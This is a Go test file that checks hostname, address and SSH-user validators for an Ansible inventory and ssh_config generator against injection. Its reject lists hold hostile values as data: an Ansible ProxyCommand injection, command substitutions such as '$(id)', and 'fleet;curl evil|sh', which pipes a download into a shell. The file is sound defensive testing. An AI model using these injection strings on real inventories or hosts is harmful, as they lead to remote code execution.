package hosts

import "testing"

// A hostname is written into the runner's INI inventory (as the alias — the first
// token) and its ssh_config, so a value carrying a space/quote/'=' can inject an
// Ansible var (ansible_ssh_common_args -> ProxyCommand) and reach RCE on the runner
// (H4). The allowlist must reject every such payload.
func TestValidHostname(t *testing.T) {
	ok := []string{"host", "web-01", "db.example.com", "h_1", "10.0.0.5"}
	for _, s := range ok {
		if !validHostname(s) {
			t.Errorf("validHostname(%q) = false, want true", s)
		}
	}
	bad := []string{
		"", // a host needs a name
		// The exact injection payload from the H4 finding.
		"h ansible_ssh_common_args='-o ProxyCommand=touch /tmp/pwned'",
		"host name", "a=b", "a'b", "a\"b", "a`b", "a$b", "a\nb", "a;b", "a b",
	}
	for _, s := range bad {
		if validHostname(s) {
			t.Errorf("validHostname(%q) = true, want false", s)
		}
	}
}

// The management/overlay address is written as ansible_host=... and the ssh_config
// HostName/Host pattern; a hostile value must not be able to inject inventory vars or
// ssh options. IPv6 literals (with colons) are legitimate and must pass.
func TestValidAddress(t *testing.T) {
	ok := []string{"", "10.0.0.5", "fd00::1", "host.internal", "wg-1_2", "2001:db8::a"}
	for _, s := range ok {
		if !validAddress(s) {
			t.Errorf("validAddress(%q) = false, want true", s)
		}
	}
	bad := []string{
		"addr ansible_user=root",
		"1.2.3.4 ansible_ssh_common_args='-o ProxyCommand=touch /tmp/pwned'",
		"a b", "a=b", "a'b", "a\"b", "a\nb", "a$(id)", "a`id`",
	}
	for _, s := range bad {
		if validAddress(s) {
			t.Errorf("validAddress(%q) = true, want false", s)
		}
	}
}

func TestValidSSHUser(t *testing.T) {
	ok := []string{"", "fleet", "root", "fleet-login", "svc_deploy", "a1"}
	for _, s := range ok {
		if !validSSHUser(s) {
			t.Errorf("validSSHUser(%q) = false, want true", s)
		}
	}
	// Anything that could break out of LOGIN='...' in the root-run enrollment
	// script must be rejected.
	bad := []string{
		"fleet;curl evil|sh", "fleet$(id)", "fleet`id`", "fleet user", "a'b",
		"-leading-dash", "1leadingdigit", "UPPER", "fleet\n", "toolongxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	}
	for _, s := range bad {
		if validSSHUser(s) {
			t.Errorf("validSSHUser(%q) = true, want false", s)
		}
	}
}
